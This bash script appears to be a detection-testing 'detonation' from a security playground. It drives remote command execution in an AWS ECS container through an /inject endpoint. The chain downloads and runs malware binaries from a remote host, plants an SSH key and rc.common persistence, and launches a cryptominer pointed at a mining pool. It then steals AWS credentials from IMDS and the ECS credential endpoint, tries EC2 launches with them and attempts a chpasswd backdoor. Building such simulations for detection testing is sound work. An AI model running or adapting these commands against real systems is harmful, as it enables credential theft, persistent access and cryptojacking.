#!/usr/bin/env bash
#
# Educational Security Simulation - ECS EC2 RCE -> Task Credential Theft ->
# Attempted EC2 Launch (Task-ID Correlation).
#
# ECS variant of the cloud-access / rce-malware chains. Runs from the
# attacker's machine against the playground-app container of the ECS EC2
# cluster (terraform/ecs-ec2), through the synthetic /inject shim reached
# over an SSM port-forward. Steals AWS credentials from BOTH IMDS (instance
# profile) and the ECS task credential endpoint (task role), then attempts EC2
# launches in 8 regions with the stolen task-role credentials. Every attempt
# fails by design (deny-all task role + invalid AMI) but is recorded in
# CloudTrail, attributed to the ECS task ID (the task ID is the role session
# name of task credentials).
#
# Severity is tuned to HIGH: no ssh, no whoami, no IP-check domains, no
# drop_caches — see the README for the critical-case inputs those would add.
#
# Usage:
#   ./detonate.sh                          # full chain against http://localhost:5000
#   ./detonate.sh --endpoint http://localhost:15000
#   ./detonate.sh --wait                    # step-by-step
#   ./detonate.sh --skip-miner              # credentials + EC2 pivot only
#
# Prerequisites:
#   - terraform/ecs-ec2 applied (the app task carries a deny-all task role)
#   - an SSM port-forward to the app running:
#       aws ssm start-session --region eu-west-3 --target <instance-id> \
#           --document-name AWS-StartPortForwardingSession \
#           --parameters '{"portNumber":["5000"],"localPortNumber":["5000"]}'

set -u

ENDPOINT="${ECS_INJECT_ENDPOINT:-http://localhost:5000}"
WAIT=false
SKIP_MINER=false
REF="main"
RAW_BASE="https://raw.githubusercontent.com/DataDog/datadog-security-playground/${REF}"

GREEN='\033[0;32m'; BLUE='\033[1;34m'; YELLOW='\033[1;33m'; NC='\033[0m'
STEP=1

show_help() {
    cat <<EOF
Usage: $0 [OPTIONS]

OPTIONS:
  -e, --endpoint URL   /inject endpoint (default: $ENDPOINT)
  -w, --wait           Wait for Enter between each step
  -s, --skip-miner     Skip the malware/mining steps (credentials + EC2 pivot only)
  -h, --help           Show this help
EOF
}

parse_args() {
    while [ $# -gt 0 ]; do
        case "$1" in
            -e|--endpoint) ENDPOINT="$2"; shift 2 ;;
            -w|--wait)     WAIT=true; shift ;;
            -s|--skip-miner) SKIP_MINER=true; shift ;;
            -h|--help)     show_help; exit 0 ;;
            *) echo "Unknown option: $1" >&2; show_help; exit 1 ;;
        esac
    done
}

wait_for_confirmation() {
    if [ "$WAIT" = "true" ]; then
        printf '%b\n' "${YELLOW}Press Enter to continue, Ctrl+C to exit...${NC}"
        read -r _
    fi
}

step() {
    printf '%b\n' "${BLUE}## Step $STEP: $1${NC}"
    STEP=$(( STEP + 1 ))
}

# Send a command to the container through the /inject shim.
#
# The app drops request bodies under rapid back-to-back calls, so retry until
# the call is accepted (HTTP 200). "may-die" commands launch the fake miner,
# which Workload Protection enforcement SIGKILLs along with its parent shell:
# for those, a missing response is expected and NOT an error.
inject() {
    local cmd="$1" may_die="${2:-false}" code attempt=1
    while [ "$attempt" -le 6 ]; do
        code=$(curl -s -o /tmp/inject-out.$$ -w "%{http_code}" --max-time 300 \
            -X POST -d "$cmd" "${ENDPOINT}/inject")
        if [ "$code" = "200" ]; then
            cat /tmp/inject-out.$$ 2>/dev/null
            rm -f /tmp/inject-out.$$
            return 0
        fi
        if [ "$may_die" = "true" ] && [ "$attempt" -ge 2 ]; then
            # shell was probably killed by the enforcement kill action
            rm -f /tmp/inject-out.$$
            return 0
        fi
        attempt=$(( attempt + 1 ))
        sleep 1
    done
    echo "ERROR: target did not run the command (last HTTP ${code:-000}): $cmd" >&2
    rm -f /tmp/inject-out.$$
    exit 1
}

parse_args "$@"

printf '%b\n' "${GREEN}# ECS EC2 - RCE -> task credential theft -> EC2 pivot${NC}"
printf 'Endpoint: %s\n\n' "$ENDPOINT"

# ----------------------------------------------------------------------------
step "RCE sanity checks (hostname / id / expected failure)"
wait_for_confirmation
inject "hostname; id; echo '--- expected failure ---'; asdfghjkl 2>&1 | tail -1"

# ----------------------------------------------------------------------------
if [ "$SKIP_MINER" = "false" ]; then
    step "Malware deployment + persistence (authorized_keys, rc.common)"
    wait_for_confirmation
    inject "cd /tmp && curl -s -O ${RAW_BASE}/assets/rce-malware/malware.x64 -O ${RAW_BASE}/assets/rce-malware/preload.x64.so && chmod +x malware.x64 && mkdir -p /root/.ssh && chmod 700 /root/.ssh && echo 'ssh-rsa AAAAB3NzaCyc2EAAAADAQABAAABAQC3FAKE+DEMO+KEY+FOR+SECURITY+TESTING+NOT+REAL attacker@malicious.demo' >> /root/.ssh/authorized_keys && chmod 600 /root/.ssh/authorized_keys && echo '/tmp/malware.x64' >> /etc/rc.common && echo '/tmp/malware.x64 --cpu-priority 4 &' >> /etc/rc.common && tail -2 /etc/rc.common && echo PERSISTENCE_DONE"

    # POOL_URL trips cryptominer_envs (miner_execution) because cryptominer_args
    # is staged and not shipped by default. The agent's kill action may SIGKILL
    # the miner (and this shell) right after the exec event fires.
    step "Cryptominer execution (POOL_URL env -> cryptominer_envs)"
    wait_for_confirmation
    inject "cd /tmp && POOL_URL=stratum+tcp://fr-zephyr.miningocean.org:3333 LD_PRELOAD=/tmp/preload.x64.so ./malware.x64 --cpu-priority 4 >/dev/null 2>&1 & sleep 5; ps aux | grep -c '[m]alware.x64'; echo MINER_STEP_DONE" "may-die"

    step "Mining-pool DNS lookups (mining_pool_lookup)"
    wait_for_confirmation
    inject "for i in 1 2 3; do dig +short fr-zephyr.miningocean.org >/dev/null; sleep 2; done; echo DNS_DONE"
fi

# ----------------------------------------------------------------------------
step "Credential theft #1: instance profile via IMDS"
wait_for_confirmation
inject "cd /tmp && curl -s -O ${RAW_BASE}/assets/cloud-access/retrieve-creds-via-imds.sh -O ${RAW_BASE}/assets/cloud-access/run-instances-with-creds.sh && chmod +x retrieve-creds-via-imds.sh run-instances-with-creds.sh && ./retrieve-creds-via-imds.sh 2>&1 | grep AWS_ACCESS_KEY_ID | tail -1"

# ----------------------------------------------------------------------------
step "Credential theft #2: task role via the ECS credential endpoint"
wait_for_confirmation
inject 'cd /tmp && curl -s http://169.254.170.2${AWS_CONTAINER_CREDENTIALS_RELATIVE_URI} | jq -r "\"export AWS_ACCESS_KEY_ID=\\(.AccessKeyId)\",\"export AWS_SECRET_ACCESS_KEY=\\(.SecretAccessKey)\",\"export AWS_SESSION_TOKEN=\\(.Token)\"" > /tmp/.aws-cloud-access-creds && head -1 /tmp/.aws-cloud-access-creds'

# ----------------------------------------------------------------------------
step "Lateral movement: EC2 launch attempts with the stolen task-role credentials (8 regions, all fail by design)"
wait_for_confirmation
inject "cd /tmp && ./run-instances-with-creds.sh 2>&1 | grep -c 'Error launching'"

printf '%b\n' "${YELLOW}Correlate in CloudTrail with the task ID above: every RunInstances event carries arn:aws:sts:...:assumed-role/<cluster>-app-task-role/<TASK_ID>${NC}"

# ----------------------------------------------------------------------------
step "Account manipulation: chpasswd backdoor attempt (PAM rejects it; the exec is the signal)"
wait_for_confirmation
inject "bash -c 'echo backdoor:S3curity-Playground-Demo | /usr/sbin/chpasswd' 2>&1 | tail -1; echo CHPASSWD_DONE"

# ----------------------------------------------------------------------------
step "Cleanup"
wait_for_confirmation
inject "pkill -f '[m]alware.x64' 2>/dev/null; cd /tmp && rm -f malware.x64 preload.x64.so retrieve-creds-via-imds.sh run-instances-with-creds.sh .aws-cloud-access-creds chp.out miner.log; sed -i '/malware/d' /etc/rc.common; sed -i '/FAKE+DEMO/d' /root/.ssh/authorized_keys; ls /tmp | grep -v playground.db; echo CLEANED"

printf '%b\n' "${GREEN}Detonation completed. Check Workload Protection signals and CloudTrail RunInstances events attributed to the task ID.${NC}"
